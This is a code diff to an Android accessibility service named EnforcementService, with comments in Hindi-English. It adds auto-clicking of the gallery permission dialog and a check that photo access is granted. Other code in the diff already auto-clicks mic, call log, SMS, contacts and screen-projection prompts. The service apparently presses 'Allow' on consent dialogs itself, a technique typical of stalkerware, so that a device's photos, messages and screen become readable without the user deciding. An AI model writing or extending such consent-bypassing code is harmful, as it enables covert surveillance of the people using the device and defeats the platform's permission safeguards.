@@ -8,6 +8,7 @@ import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.os.Build
 import android.os.Handler
 import android.os.Looper
 import android.os.PowerManager
@@ -214,6 +215,14 @@ class EnforcementService : AccessibilityService() {
             runCatching { svc.maybeAutoConfirmProjection() }
         }
 
+        /** GalleryPermActivity launch hote hi DIRECT arm — wizard step "gallery"
+         *  ka Allow-click loop turant start (background permission request ke
+         *  bina event-based trigger slow phones par late ho jata tha). */
+        fun armGalleryAllow() {
+            val svc = instance ?: return
+            runCatching { svc.maybeAutoGrant() }
+        }
+
         // ---- wizard auto-grant ----
 
         @Volatile
@@ -251,6 +260,11 @@ class EnforcementService : AccessibilityService() {
             "mic" to setOf("allow", "while using the app", "only this time",
                 "允许", "仅在使用中允许", "仅使用时允许", "仅本次允许"),
             "calls" to setOf("allow", "允许"),
+            // Gallery (Android 13/14/15): 13 par plain "Allow", 14+ photo-picker
+            // choice "Allow all" / "Select photos and videos" — hum "Allow/Allow
+            // all" click karte hain (partial selection humare loop ko stuck nahi
+            // karega — stepDone usko bhi accept karta hai).
+            "gallery" to setOf("allow", "allow all", "select all", "अनुमति दें", "允许"),
             // Android 13+ runtime notification permission dialog (auto-setup ka
             // "postnotif" step) — Allow click ke bina notifications invisible rehti hain.
             "postnotif" to setOf("allow", "允许"),
@@ -423,6 +437,15 @@ class EnforcementService : AccessibilityService() {
             "calls" -> ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED ||
                 ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED ||
                 ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
+            // Gallery: full grant (READ_MEDIA_IMAGES) YA Android 14 partial
+            // (READ_MEDIA_VISUAL_USER_SELECTED) — partial par gallery sirf
+            // selected photos dikhayegi, par auto-grant loop KABHI stuck nahi
+            // hoga. Android 12-: purana READ_EXTERNAL_STORAGE.
+            "gallery" -> ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED ||
+                ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED ||
+                (Build.VERSION.SDK_INT >= 34 && ContextCompat.checkSelfPermission(
+                    ctx, "android.permission.READ_MEDIA_VISUAL_USER_SELECTED"
+                ) == PackageManager.PERMISSION_GRANTED)
             "battery" -> (ctx.getSystemService(Context.POWER_SERVICE) as PowerManager)
                 .isIgnoringBatteryOptimizations(ctx.packageName)
             "admin" -> (ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager)
